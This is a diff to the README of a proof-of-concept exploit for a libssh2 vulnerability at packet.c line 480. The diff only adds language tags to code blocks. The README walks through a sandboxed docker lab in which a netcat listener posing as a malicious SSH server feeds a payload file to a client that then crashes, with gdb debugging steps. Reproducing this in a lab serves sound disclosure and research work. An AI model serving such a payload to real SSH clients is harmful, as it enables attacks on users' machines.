@@ -6,7 +6,7 @@ This directory contains a proof of concept exploit for the vulnerability. It use
 
 The source location of the vulnerability is [packet.c:480](https://github.com/libssh2/libssh2/blob/42d37aa63129a1b2644bf6495198923534322d64/src/packet.c#L480):
 
-```
+```c
 if(message_len < datalen-13) {
 ```
 
@@ -16,7 +16,7 @@ The value of `datalen` is untrusted because it came from the remote computer. If
 
 Create a docker network bridge, to simulate a network with two separate computers.
 
-```
+```bash
 docker network create -d bridge --subnet 172.18.0.0/16 libssh2-demo-network
 ```
 
@@ -24,19 +24,19 @@ docker network create -d bridge --subnet 172.18.0.0/16 libssh2-demo-network
 
 Build the docker image:
 
-```
+```bash
 docker build server -t libssh2-server --build-arg UID=`id -u`
 ```
 
 Start the container:
 
-```
+```bash
 docker run --rm --network libssh2-demo-network --ip=172.18.0.10 -i -t libssh2-server
 ```
 
 Start the malicious "ssh server":
 
-```
+```bash
 sudo nc -l -p 22 < poc.bin  # password is x
 ```
 
@@ -44,25 +44,25 @@ sudo nc -l -p 22 < poc.bin  # password is x
 
 Build the docker image:
 
-```
+```bash
 docker build client -t libssh2-client --build-arg UID=`id -u`
 ```
 
 Start the container:
 
-```
+```bash
 docker run --rm --network libssh2-demo-network --ip=172.18.0.11 -i -t libssh2-client
 ```
 
 If you want to be able to debug libssh2 with gdb, then you need to start the container with a few extra arguments:
 
-```
+```bash
 docker run --rm --network libssh2-demo-network --ip=172.18.0.11 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -i -t libssh2-client
 ```
 
 In the container, attempt to connect to the server:
 
-```
+```bash
 cd ~/libssh2/example
 ./ssh2 172.18.0.10
 ```
@@ -71,7 +71,7 @@ This command crashes with a segmentation fault.
 
 If you would like to debug libssh2 with [gdb](https://www.gnu.org/software/gdb/), then start it like this:
 
-```
+```bash
 cd ~/libssh2/example/.libs
 LD_LIBRARY_PATH="/home/victim/libssh2/src/.libs:$LD_LIBRARY_PATH" gdb --args ./ssh2 172.18.0.10
 ```
